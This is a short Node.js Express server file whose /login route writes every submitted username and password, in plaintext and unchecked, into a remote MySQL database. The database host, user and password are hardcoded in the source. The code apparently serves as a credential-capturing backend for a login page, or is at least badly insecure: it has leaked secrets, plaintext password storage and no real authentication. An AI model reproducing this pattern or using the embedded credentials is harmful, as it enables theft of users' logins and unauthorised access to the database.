const express = require('express');
const mysql = require('mysql');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

// MySQL connection
const db = mysql.createConnection({
    host: '37.187.149.30',
    user: 'u9934_rzwsckB1yz',
    password: 'zLHM@8I@X=6oQn7uk.P@iDPP',
    database: 's9934_ravenlogin'
});

db.connect(err => {
    if (err) throw err;
    console.log('Database connected!');
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files like CSS

app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Example of storing user data (adjust according to your needs)
    const sql = 'INSERT INTO users (username, password) VALUES (?, ?)';
    db.query(sql, [username, password], (err, result) => {
        if (err) throw err;
        res.send('User logged in and saved to the database!');
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
